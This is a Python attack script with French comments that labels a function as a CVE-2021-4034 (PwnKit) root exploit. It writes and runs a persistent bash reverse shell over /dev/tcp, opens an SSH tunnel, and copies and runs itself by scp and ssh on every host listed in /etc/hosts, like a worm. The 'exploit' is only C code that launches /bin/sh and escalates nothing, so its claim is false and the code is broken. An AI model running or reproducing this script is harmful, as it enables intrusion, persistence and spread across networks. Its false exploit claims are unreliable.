import os
import socket

def get_local_ip():
    # Retrieve the IP address of the local machine
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))  # Using Google DNS as a dummy connection
    local_ip = s.getsockname()[0]
    s.close()
    return local_ip

# Code d'exploit pour CVE-2021-4034 (PwnKit)
def exploit_pwnkit():
    kit_code = b"""
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>

    int main() {
        char *args[] = {"/bin/sh", NULL};
        execv("/bin/sh", args);
        return 0;
    }
    """
    
    # Sauvegarde du code d'exploit dans un fichier
    with open("/tmp/kit.c", "wb") as f:
        f.write(kit_code)
    
    # Compilation du code d'exploit
    os.system("gcc /tmp/kit.c -o /tmp/kit")
    
    # Exécution de l'exploit pour obtenir un shell root
    os.system("chmod +x /tmp/kit && /tmp/kit")

def propagate_script():
    script_code = """
    #!/bin/bash

    user="danielfebrero"

    for host in $(awk '{print $1}' /etc/hosts); do
        if [[ $host =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || [[ $host =~ ^[a-zA-Z0-9.-]+$ ]]; then
            scp /tmp/exploit.py $user@$host:/tmp/exploit.py
            ssh $user@$host 'python3 /tmp/exploit.py'
        fi
    done
    """
    
    # Sauvegarde du script de propagation dans un fichier
    with open("/tmp/propagate.sh", "w") as f:
        f.write(script_code)
    
    # Exécution du script de propagation
    os.system("chmod +x /tmp/propagate.sh && /tmp/propagate.sh")

def reactivate(local_ip):
    # Étape 1: Élever les privilèges et accéder à un shell root
    exploit_pwnkit()

    # Étape 2: Créer et exécuter le script d'exploit persistant
    exploit_content = '''
    #!/bin/bash
    
    # Script pour ouvrir une porte persistante (reverse shell)
    while true; do
        /bin/bash -i >& /dev/tcp/{local_ip}/8890 0>&1
        sleep 10
    done
    '''
    # Écrire le contenu dans un fichier exploit.sh
    with open('/tmp/exploit.sh', 'w') as file:
        file.write(exploit_content)
    
    # Donner les permissions d'exécution au fichier exploit.sh
    command_step2 = "chmod +x /tmp/exploit.sh"
    os.system(command_step2)
    
    # Exécuter le script exploit.sh en arrière-plan
    command_step2_background = "/tmp/exploit.sh &"
    os.system(command_step2_background)

    # Étape 3: Ouvrir un tunnel SSH local entre les ports 8889 et 8888
    command_step3 = "ssh -f -N -L 8889:localhost:8888 localhost"
    os.system(command_step3)

    # Étape 4: Propager l'exploit sur tous les côtés
    propagate_script()


# Appel de la fonction de réactivation
local_ip = get_local_ip()
reactivate(local_ip)
